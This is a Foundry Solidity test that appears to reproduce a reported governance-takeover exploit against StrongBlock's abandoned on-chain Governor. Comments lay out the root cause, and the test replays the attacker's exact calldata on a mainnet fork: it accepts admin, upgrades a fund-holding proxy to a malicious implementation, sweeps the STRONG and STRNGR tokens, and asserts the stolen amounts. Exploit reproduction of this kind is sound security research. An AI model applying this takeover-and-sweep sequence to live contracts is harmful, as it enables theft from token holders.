// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// StrongBlock — governance takeover of an abandoned on-chain Governor, then abuse of
// the seized proxy-upgrade authority to swap a fund-holding proxy's implementation and
// sweep the treasury. ~32,695 STRONG + ~383,447 STRNGR drained on Ethereum (~$72K).
//
// Attacker EOA: 0xACBCa357981870f30130B145762d671891CA810c
// Victim (StrongBlock Governor, admin of the Upgrader): 0xBDDC7Ef8BaCeacE16DCE005102639a4bB86CB8C1
// Upgrader (Compound-style admin controlling the proxies): 0x75C53809A047c3d422B91Eda50A20914fBe91C61
// Service proxy that HELD the tokens (OZ AdminUpgradeabilityProxy): 0x53cA51Ba980B6475C13d158c1825013cf81038Fc
// Attacker-deployed malicious implementation: 0xe89C0d3FcE4EB31060b6a0329bA408029D0c4106
//
// Root cause (governance capture, verified on-chain, same class as the CompoundProvider /
// BarnBridge precedent already in this repo):
//   - The Upgrader (0x75C5) is admin of the StrongBlock proxies. Its admin was the Governor
//     0xBDDC. The Governor's vote token (STRONG) is near worthless and the DAO abandoned, so
//     the attacker acquired majority voting weight on the open market, then pushed a proposal
//     through the Governor's own propose/vote/queue/execute flow calling setPendingAdmin(attacker)
//     on the Upgrader. That is settled on-chain before this replay: at block 25691518,
//     Upgrader.admin() == Governor 0xBDDC and Upgrader.pendingAdmin() == attacker EOA. No stolen
//     key or signature anywhere — the attacker became privileged through the DAO's own machinery.
//   - The value-loss sequence (attacker EOA tx nonces, all on-chain):
//       n0  block 25691471  deploy malicious impl 0xe89c0d3f
//       n1  block 25691519  Upgrader.acceptAdmin()                 -> attacker becomes Upgrader admin
//       n2  block 25691525  Upgrader.upgrade(serviceProxy, malImpl)-> service proxy now malicious
//       n3  block 25691527  serviceProxy.run() [selector 0xc0406226] -> sweeps STRONG+STRNGR to caller
//     Later, in a separate tx (nonce 23, the hash originally provided,
//     0x92be5e374e260192f8fdb5ffdc33504c768ecad091cc7dbc37282e5ca8ea94c6), the same upgrade
//     primitive was applied to the Governor proxy 0xBDDC itself. That governor proxy holds no
//     STRONG/STRNGR, so it is not the fund-loss tx; the ~$72K loss is the service-proxy drain above.
//
// The malicious impl is unverified, so run() (0xc0406226) and its attacker-gating are treated as
// apparent root cause from the trace (a payout-to-caller sweep), not confirmed source.
//
// PoC strategy (BarnBridge/CompoundProvider style): fork at block 25691518, one block before the
// attacker calls acceptAdmin, so the governance seizure (pendingAdmin == attacker) is already
// settled and we do not replay the vote. Then, as the attacker EOA, replay the three privileged
// actions verbatim against live state: acceptAdmin -> upgrade(service, malImpl) -> run(). Assert
// the attacker's STRONG and STRNGR balances rise by the full reported amounts.
//
// Run: forge test --contracts ./src/test/2026-08/StrongBlock_exp.sol -vvv
// Requires an Ethereum archive RPC (see foundry.toml [rpc_endpoints]).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IUpgrader {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
}

contract StrongBlockExp is Test {
    address constant ATTACKER = 0xACBCa357981870f30130B145762d671891CA810c;
    address constant GOVERNOR = 0xBDDC7Ef8BaCeacE16DCE005102639a4bB86CB8C1; // Upgrader.admin (seized)
    address constant UPGRADER = 0x75C53809A047c3d422B91Eda50A20914fBe91C61;
    address constant SERVICE = 0x53cA51Ba980B6475C13d158c1825013cf81038Fc; // proxy holding the tokens
    address constant MAL_IMPL = 0xE89C0D3FCe4EB31060b6A0329Ba408029d0c4106; // already deployed on-chain

    IERC20 constant STRONG = IERC20(0x990f341946A3fdB507aE7e52d17851B87168017c);
    IERC20 constant STRNGR = IERC20(0xDc0327D50E6C73db2F8117760592C8BBf1CDCF38);

    uint256 constant FORK_BLOCK = 25691518; // one block before attacker's acceptAdmin (nonce 1)

    // Exact on-chain calldata pulled from the attacker's transactions.
    // n1: Upgrader.acceptAdmin()
    bytes constant ACCEPT_ADMIN = hex"0e18b681";
    // n2: Upgrader.upgrade(0x53ca51ba..., 0xe89c0d3f...)  -- swap service proxy impl to malicious
    bytes constant UPGRADE_CALLDATA =
        hex"99a88ec400000000000000000000000053ca51ba980b6475c13d158c1825013cf81038fc000000000000000000000000e89c0d3fce4eb31060b6a0329ba408029d0c4106";
    // n3: serviceProxy.run() -- sweep STRONG + STRNGR to caller
    bytes constant DRAIN_CALLDATA = hex"c0406226";

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(GOVERNOR, "StrongBlockGovernor");
        vm.label(UPGRADER, "Upgrader");
        vm.label(SERVICE, "ServiceProxy");
        vm.label(MAL_IMPL, "MaliciousImpl");
        vm.label(address(STRONG), "STRONG");
        vm.label(address(STRNGR), "STRNGR");
    }

    function testExploit() public {
        // Governance seizure is already settled: the Governor still holds admin, and the
        // proposal that named the attacker as pendingAdmin has executed on-chain.
        assertEq(IUpgrader(UPGRADER).admin(), GOVERNOR, "admin should still be the Governor pre-accept");
        assertEq(IUpgrader(UPGRADER).pendingAdmin(), ATTACKER, "attacker must already be pendingAdmin (governance-set)");

        uint256 strongBefore = STRONG.balanceOf(ATTACKER);
        uint256 strngrBefore = STRNGR.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker STRONG before", strongBefore, 18);
        emit log_named_decimal_uint("attacker STRNGR before", strngrBefore, 18);

        vm.startPrank(ATTACKER, ATTACKER);

        // 1) Claim the seized admin role on the Upgrader.
        (bool ok1, ) = UPGRADER.call(ACCEPT_ADMIN);
        require(ok1, "acceptAdmin reverted");
        assertEq(IUpgrader(UPGRADER).admin(), ATTACKER, "attacker should now be Upgrader admin");

        // 2) Abuse upgrade authority: point the fund-holding proxy at the malicious implementation.
        (bool ok2, ) = UPGRADER.call(UPGRADE_CALLDATA);
        require(ok2, "upgrade reverted");

        // 3) Trigger the malicious impl's sweep-to-caller entrypoint (run()).
        (bool ok3, ) = SERVICE.call(DRAIN_CALLDATA);
        require(ok3, "run() drain reverted");

        vm.stopPrank();

        uint256 strongStolen = STRONG.balanceOf(ATTACKER) - strongBefore;
        uint256 strngrStolen = STRNGR.balanceOf(ATTACKER) - strngrBefore;
        emit log_named_decimal_uint("STRONG stolen", strongStolen, 18);
        emit log_named_decimal_uint("STRNGR stolen", strngrStolen, 18);

        // Reported loss: 32,695.76 STRONG + 383,447.17 STRNGR (~$72K).
        assertApproxEqAbs(strongStolen, 32_695_761681139289948188, 1e18, "STRONG drained off reported ~32,695");
        assertApproxEqAbs(strngrStolen, 383_447_167298953142701545, 1e18, "STRNGR drained off reported ~383,447");
    }
}
